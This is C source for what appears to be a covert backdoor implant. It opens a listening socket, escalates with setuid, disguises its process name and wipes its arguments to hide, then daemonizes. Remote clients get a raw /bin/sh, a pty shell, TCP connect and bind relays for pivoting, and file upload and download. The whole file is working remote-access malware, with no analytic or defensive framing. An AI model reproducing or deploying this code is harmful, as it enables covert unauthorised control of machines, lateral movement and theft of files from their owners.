#include "common.h"

void handle_signals() {
	struct sigaction sa;

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = SIG_IGN;
	syscall2(SC_SIGACTION, SIGCHLD, (uint32_t) &sa);
}

void do_setuid() {
        syscall0(SC_SETUID);
}

void hide(char **argv, char *hidden) {
        syscall2(SC_PRCTL, PR_SET_NAME, (uint32_t) hidden);
        memset(argv[0], 0, strlen(argv[0]));
        memcpy(argv[0], hidden, strlen(hidden) + 1);
	memset(argv[1], 0, strlen(argv[1]));
	memset(argv[2], 0, strlen(argv[2]));
}

void daemonize() {
        int ret;

        ret = syscall0(SC_FORK);
        if (ret != 0) syscall0(SC_EXIT);

        ret = syscall0(SC_FORK);
        if (ret != 0) syscall0(SC_EXIT);
        for (ret = 0; ret < 3; ret++)
		syscall1(SC_CLOSE, ret);
        syscall0(SC_SETSID);
}

int listen_on(int port) {
	struct sockaddr_in local;
	int s, ret;

	memset(&local, 0, sizeof(local));
	
	local.sin_family = AF_INET;
	local.sin_port = htons(port);
	local.sin_addr.s_addr = INADDR_ANY;

	s = syscall2(SC_SOCKET, AF_INET, SOCK_STREAM);
	
	ret = syscall3(SC_BIND, s, (uint32_t) &local, sizeof(local));
	check(2, ret, "3 Failed to bind socket", 1);

	syscall1(SC_LISTEN, s);

	return s;
}

int forward(int source, int dest, int err_report) {
	int r;
	char buf[1024];
	r = syscall3(SC_READ, source, (long int) buf, sizeof(buf));
	check(err_report, r, "3 Failed to read", 0);
	if (r <= 0) return r;
	
	r = syscall3(SC_WRITE, dest, (long int) buf, r);
	check(err_report, r, "3 Failed to write", 0);
	return r;
}

void communicate(int client, int other) {
	int r;
	int m = (client > other) ? client : other;

	for (;;) {
		fd_set fds;
		FD_ZERO(&fds);
		FD_SET(client, &fds);
		FD_SET(other, &fds);
		r = syscall2(SC_SELECT, m + 1, (long int) &fds);
		check(client, r, "3, select failed", 0);
		if (r < 0) return;
		
		if (FD_ISSET(client, &fds)) 
			if (forward(client, other, client) <= 0) break;
		
		if (FD_ISSET(other, &fds))
			if (forward(other, client, client) <= 0) break;
	}
	fputstring(client, "END_OF_COMMUNICATION\n");
	fputstring(client, "0 Connection closed\n");
}

void do_shell(int sock) {
	int r;
	for (r = 0; r < 3; r++)
		syscall2(SC_DUP2, sock, r);
	char *argv[] = {"/bin/sh", 0};
	char *envp[] = {0};
	fputstring(sock, "1 Processing command\n");
	fputstring(sock, "4 SHELL\n");
	r = syscall3(SC_EXECVE, (uint32_t) "/bin/sh", (uint32_t) argv, (uint32_t) envp);
	check(sock, r, "3 Failed to exec shell", 0);
}

char *num_append(char *s, int num) {
	int q,r;
	q = (num * 3277) >> 15;
	if (num >= 10) {
		s = num_append(s, q);
	}
	r = num - q*10;
	*s = r + '0';
	s++;
	return s;
}

void do_tty(int sock) {
	fputstring(sock, "1 Processing command\n");
	int master, slave_id, zero=0, r;
	char slave_name[256];
	char *ptr;
	memcpy(slave_name, "/dev/pts/", 10);

	master = syscall2(SC_OPEN, (long int) "/dev/ptmx", O_RDWR|O_NOCTTY);
	check(sock, master, "3 Failed to open master pty", 0);
	if (master < 0) return;
	
	syscall3(SC_IOCTL, master, TIOCGPTN, (long int) &slave_id);
	
	ptr = num_append(slave_name + strlen(slave_name), slave_id);
	*ptr = 0;

	syscall3(SC_IOCTL, master, TIOCSPTLCK, (long int) &zero);

	r = syscall0(SC_FORK);
	check(sock, r, "3 Fork failed", 0);
	if (r < 0) return;

	if (r == 0) {
		int i;
		char *argv[] = {"/bin/sh", 0};
		char *envp[] = {0};
		
		syscall1(SC_CLOSE, master);
		syscall1(SC_CLOSE, sock);
			
		syscall0(SC_SETSID);
		
		for (i = 0; i < 3; i++)
			syscall2(SC_OPEN, (long int) slave_name, O_RDWR);
		
		r = syscall3(SC_EXECVE, (long int) "/bin/sh", (long int) argv, (long int) envp);
		check(1, r, "Failed to exec shell", 0);
		syscall0(SC_EXIT);
	}
	fputstring(sock, "4 TTY\n");
	communicate(sock, master);
	syscall1(SC_CLOSE, master);
}

void do_connect(int sock, uint32_t addr, int port) {
	struct sockaddr_in remote;
	int s, ret;

	fputstring(sock, "1 Processing command\n");
	memset(&remote, 0, sizeof(remote));
	remote.sin_family = AF_INET;
	remote.sin_port = htons(port);
	remote.sin_addr.s_addr = addr;

	s = syscall2(SC_SOCKET, AF_INET, SOCK_STREAM);

	ret = syscall3(SC_CONNECT, s, (uint32_t) &remote, sizeof(remote));
	check(sock, ret, "3 Failed to connect socket", 0);
	if (ret < 0) return;
	
	fputstring(sock, "4 CONNECT\n");

	communicate(sock, s);
	syscall1(SC_CLOSE, s);
}

void do_bind(int sock, int port) {
	struct sockaddr_in local, remote;
	int remotelen;
	int s, ret, cs;

	fputstring(sock, "1 Processing command\n");
	memset(&local, 0, sizeof(local));
	
	local.sin_family = AF_INET;
	local.sin_port = htons(port);
	local.sin_addr.s_addr = INADDR_ANY;

	s = syscall2(SC_SOCKET, AF_INET, SOCK_STREAM);
	
	ret = syscall3(SC_BIND, s, (uint32_t) &local, sizeof(local));
	check(sock, ret, "3 Failed to bind socket", 0);
	if (ret < 0) return;

	syscall1(SC_LISTEN, s);

	memset(&remote, 0, sizeof(remote));
	remotelen = sizeof(remote);
	cs = syscall3(SC_ACCEPT, s, (long int) &remote, (long int) &remotelen);
	check(sock, ret, "3 Failed to accept", 0);
	if (cs < 0) return;

	fputstring(sock, "4 ACCEPT\n");
	fputstring(sock, "ADDR ");
	fputhex(sock, remote.sin_addr.s_addr);
	fputstring(sock, "\nPORT ");
	fputhex(sock, remote.sin_port);
	fputstring(sock, "\n");
	syscall1(SC_CLOSE, s);

	communicate(sock, cs);
	syscall1(SC_CLOSE, cs);
}

void do_download(int sock, char *path) {
	int fd, size, ret;
	fputstring(sock, "1 Processing command\n");

	fd = syscall2(SC_OPEN, (long int) path, O_RDONLY);
	check(sock, fd, "3 Failed to open file", 0);
	if (fd < 0) return;

	fputstring(sock, "4 BINSND\nSIZE ");

	size = syscall3(SC_LSEEK, fd, 0, SEEK_END);
	if (size >= 0) {
		fputhex(sock, size);
		syscall3(SC_LSEEK, fd, 0, SEEK_SET);
	} else {
		fputstring(sock, "UNKNOWN");
	}
	fputstring(sock, "\n");

	for(;;) {
		ret = forward(fd, sock, sock);
		if (ret <= 0) break;
	}
	if (ret == 0)
		fputstring(sock, "0 File transfer successful\n");

	syscall1(SC_CLOSE, fd);
}

void do_upload(int sock, char *path, int size) {
	int total = 0, fd, ret;

	fputstring(sock, "1 Processing command\n");

	fd = syscall3(SC_OPEN, (long int) path, O_WRONLY|O_CREAT|O_TRUNC, 0777);
	check(sock, fd, "3 Failed to open file", 0);
	if (fd < 0) return;

	fputstring(sock, "4 BINRCV\n");


	while (total < size) {
		ret = forward(sock, fd, sock);
		if (ret <= 0) return;

		total += ret;
	}
	fputstring(sock, "0 File transfer successful\n");
	syscall1(SC_CLOSE, fd);
}


void handle_command(char *buf, int sock) {
	char *args[16];
	int a;

	a = explode(buf, ' ', args, 16);

	if (!strcmp(args[0], "shell")) {
		do_shell(sock);
	} else if (!strcmp(args[0], "tty")) {
		do_tty(sock);
	} else if (!strcmp(args[0], "bind")) {
		int n;
		if (a != 2) {
			fputstring(sock, "2 Syntax error\n");
			return;
		} 
		n = parse_int(args[1]);
		if ((n < 0) || (n > 65535)) {
			fputstring(sock, "2 Syntax error\n");
			return;
		} 
		do_bind(sock, n);
	} else if (!strcmp(args[0], "connect")) {
		uint32_t addr = 0;
		char *ip[5];
		int i, p, n;

		if (a != 3) {
			fputstring(sock, "2 Syntax error\n");
			return;
		} 

		p = explode(args[1], '.', ip, 5);
		if (p != 4) {
			fputstring(sock, "2 Syntax error\n");
			return;
		}
		for (i = 3; i >= 0; i--) {
			n = parse_int(ip[i]);
			if ((n < 0) || (n > 255)) {
				fputstring(sock, "2 Syntax error\n");
				return;
			}
			addr <<= 8;
			addr |= n;
		}
		n = parse_int(args[2]);
		if ((n < 0) || (n > 65535)) {
			fputstring(sock, "2 Syntax error\n");
			return;
		}
		do_connect(sock, addr, n);
	} else if (!strcmp(args[0], "download")) {
		if (a != 2) {
			fputstring(sock, "2 Syntax error\n");
			return;
		} 
		do_download(sock, args[1]);

	} else if (!strcmp(args[0], "upload")) {
		if (a != 3) {
			fputstring(sock, "2 Syntax error\n");
			return;
		}
		int n = parse_int(args[2]);
		if (n == -1) {
			fputstring(sock, "2 Syntax error\n");
			return;
		} 
		do_upload(sock, args[1], n);
	} else if (!strcmp(args[0], "exit")) {
		syscall0(SC_EXIT);
	} else {
		fputstring(sock, "2 Syntax error\n");
	}
}

void handle_client(int sock) {
	int r;
	char buf[1024];
	r = syscall3(SC_WRITE, sock, (uint32_t) "0 Hello\n", 8);

	for(;;) {
		if (r < 0)
			syscall0(SC_EXIT);

		r = syscall3(SC_READ, sock, (uint32_t) buf, sizeof(buf));
		if (r <= 0)
			syscall0(SC_EXIT);

		buf[r] = 0;
		if (r > 0 && buf[r-1] == '\n')
			buf[r-1] = 0;
		handle_command(buf, sock);
	}
}

void main_loop(int s) {
	int cs, ret, remotelen;
	struct sockaddr_in remote;

	for(;;) {
		memset(&remote, 0, sizeof(remote));
		remotelen = sizeof(remote);
		cs = syscall3(SC_ACCEPT, s, (uint32_t) &remote, (uint32_t) &remotelen);
		if (cs < 0) continue;
		
		ret = syscall0(SC_FORK);
		if (ret == 0) {
			syscall1(SC_CLOSE, s);
			handle_client(cs);
		}
		syscall1(SC_CLOSE, cs);
	}
}
int main(int argc, char **argv) {
	int s;

	if (argc != 3) {
		fputstring(1, "usage: ");
		fputstring(1, argv[0]);
		fputstring(1, " <port> <hidden name>\n");
		return 1;
	}

	fputstring(1, "Starting...\n");

	handle_signals();

	do_setuid();

	s = listen_on(parse_int(argv[1]));
	
	hide(argv, argv[2]);

	daemonize();
	
	main_loop(s);

	return 0;
}
